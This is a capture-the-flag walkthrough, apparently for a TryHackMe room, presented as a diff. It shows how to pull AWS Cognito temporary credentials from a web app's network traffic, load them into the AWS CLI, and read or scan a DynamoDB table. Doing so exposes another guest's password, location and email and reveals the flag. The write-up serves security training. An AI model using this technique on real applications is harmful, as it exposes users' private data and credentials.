@@ -1,0 +1,30 @@
+1. Reconnaissance (Browser DevTools)
+Open the target URL and press F12 to open Developer Tools.
+Go to the Network tab and refresh the page. 
+Find Cognito Request: Filter for cognito-identity. Look for a POST to cognito-identity.us-east-1.amazonaws.com with the header X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity. 
+Extract Credentials: Click the request → Response tab. Copy the JSON values:
+AccessKeyId (starts with ASIA...)
+SecretKey
+SessionToken
+IdentityId
+Find Target Table: Filter for dynamodb. Inspect the request payload to find the TableName (e.g., complimentary-GuestWellnessProfiles) and the guest_id format (e.g., guest-xxxxxx). 
+2. Configuration (AWS CLI)
+Set the extracted credentials as environment variables in your terminal:
+
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+export AWS_DEFAULT_REGION="us-east-1"
+
+3. Execution & Data Dump
+Verify Access: Confirm you can read your own profile.
+aws dynamodb get-item --table-name complimentary-GuestWellnessProfiles --key '{"guest_id":{"S":"guest-YOUR_ID"}}'
+
+Access Other Users: Prove the authorization flaw by reading a different user (e.g., "Lambo").
+aws dynamodb get-item --table-name complimentary-GuestWellnessProfiles --key '{"guest_id":{"S":"guest-lambo"}}'
+
+Result: You will see Lambo's password, GPS coordinates, and email.
+Retrieve the Flag: Scan the entire table to find the hidden flag.
+aws dynamodb scan --table-name complimentary-GuestWellnessProfiles | grep -i "THM{"
+
+Flag Format: Typically found in a notes field, e.g., THM{fr33_app_fr33_d4t4!}. 
